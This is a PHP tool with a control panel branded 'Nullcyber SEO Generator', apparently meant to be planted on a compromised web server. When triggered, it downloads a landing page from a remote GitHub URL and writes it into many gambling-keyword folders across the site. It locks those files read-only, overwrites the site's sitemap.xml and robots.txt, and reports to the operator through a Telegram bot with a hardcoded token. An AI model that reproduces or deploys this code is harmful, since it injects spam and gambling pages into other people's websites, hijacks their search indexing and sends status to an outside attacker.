<?php
$keywords = [
    'ok88', 'ok88-gacor', 'ok88-slotgacor', 'ok88-gambler', 'ok88-online-kasino',
    'slot-gacor-hari-ini', 'link-slot-gacor-terpercaya', 'slot-bonus-new-member',
    'rtp-slot-tertinggi', 'slot-gacor-pragmatic'
];

$landingUrl  = "https://raw.githubusercontent.com/Cnull00/file_file/main/landing.php";
$telegramToken = '8481177639:AAGRYKPlQxr1PXcMqHgBTQo3MmmSkv_iI7w';
$chatId = '1883446251';

function sendTelegram($token, $chatId, $message) {
    $url = "https://api.telegram.org/bot$token/sendMessage";
    $data = ['chat_id' => $chatId, 'text' => $message];
    @file_get_contents($url . '?' . http_build_query($data));
}

function is_url_ok($url) {
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_NOBODY => true,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 5,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_SSL_VERIFYPEER => false
    ]);
    curl_exec($ch);
    $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    return ($httpcode == 200);
}

function generateAll($keywords, $landingUrl) {
    $baseDir = __DIR__;
    $dirs = array_filter(glob($baseDir . '/*'), 'is_dir');

    if (empty($dirs)) {
        $new = $baseDir . '/nseo';
        mkdir($new);
        $dirs = [$new];
    }

    $validUrls = [];
    $landingContent = @file_get_contents($landingUrl);

    if (!$landingContent) {
        die("\u{274C} Gagal mengambil konten dari GitHub!");
    }

    $htaccessContent = <<<HT
RewriteEngine On
RewriteCond %{HTTPS} off
RewriteRule ^ https://%{HTTP_HOST}%{REQUEST_URI} [L,R=301]

<FilesMatch "^(index\\.php)\$">
    Order Allow,Deny
    Allow from all
</FilesMatch>

<FilesMatch "^(?!index\\.php\$).*$">
    Order Allow,Deny
    Deny from all
</FilesMatch>

<IfModule mod_deflate.c>
    AddOutputFilterByType DEFLATE text/plain text/html text/xml text/css application/javascript application/json
</IfModule>

<IfModule mod_expires.c>
    ExpiresActive On
    ExpiresByType image/png "access plus 1 month"
</IfModule>

<IfModule mod_headers.c>
    Header set X-Robots-Tag "index, follow"
</IfModule>
HT;

    foreach ($dirs as $dir) {
        $nseoPath = $dir . '/nseo';
        if (!file_exists($nseoPath)) mkdir($nseoPath, 0777, true);

        foreach ($keywords as $slug) {
            $targetFolder = "$nseoPath/$slug";
            if (!file_exists($targetFolder)) mkdir($targetFolder, 0777, true);

            $title = ucwords(str_replace('-', ' ', $slug));
            $phpPage = str_replace('{{title}}', $title, $landingContent);

            file_put_contents("$targetFolder/index.php", $phpPage);
            file_put_contents("$targetFolder/.htaccess", $htaccessContent);
            chmod("$targetFolder/index.php", 0444);
            chmod("$targetFolder/.htaccess", 0444);

            $dirName = basename($dir);
            $url = "https://" . $_SERVER['HTTP_HOST'] . "/$dirName/nseo/$slug/";
            if (is_url_ok($url)) {
                $validUrls[] = $url;
            }
        }
    }

    $sitemap = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<urlset xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\">\n";
    foreach ($validUrls as $url) {
        $sitemap .= "<url>\n<loc>$url</loc>\n<lastmod>" . date("Y-m-d") . "</lastmod>\n<changefreq>daily</changefreq>\n<priority>1.0</priority>\n</url>\n";
    }
    $sitemap .= "</urlset>";
    file_put_contents($baseDir . '/sitemap.xml', $sitemap);

    $robots = "User-agent: *\nAllow: /\nSitemap: https://" . $_SERVER['HTTP_HOST'] . "/sitemap.xml";
    file_put_contents($baseDir . '/robots.txt', $robots);

    return count($validUrls);
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $count = generateAll($keywords, $landingUrl);
    sendTelegram($telegramToken, $chatId, "\u{2705} $count landing page aktif!\nSitemap: https://" . $_SERVER['HTTP_HOST'] . "/sitemap.xml");
    echo "<script>document.getElementById('loading').style.display = 'none';alert('Generate sukses! Total $count halaman aktif');window.location='index.php';</script>";
    exit;
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Landing Generator - Nullcyber</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #0d0d0d;
            color: #eee;
            text-align: center;
            padding-top: 80px;
        }
        .container {
            background: #181818;
            padding: 40px;
            border-radius: 12px;
            box-shadow: 0 0 15px #0f0;
            display: inline-block;
        }
        h1 { color: #0f0; }
        button {
            background: #0f0;
            color: #000;
            border: none;
            padding: 15px 35px;
            font-size: 16px;
            font-weight: bold;
            border-radius: 8px;
            cursor: pointer;
        }
        #loading {
            display: none;
            color: #0f0;
            margin-top: 20px;
            font-size: 18px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>\u{1F680} Nullcyber SEO Generator</h1>
        <p>Generate landing terenkripsi + htaccess + sitemap otomatis</p>
        <form method="POST" onsubmit="showLoading()">
            <button type="submit">Jalankan Sekarang</button>
        </form>
        <div id="loading">\u{23F3} Sedang memproses, mohon tunggu...</div>
    </div>

    <script>
        function showLoading() {
            document.getElementById('loading').style.display = 'block';
        }
    </script>
</body>
</html>
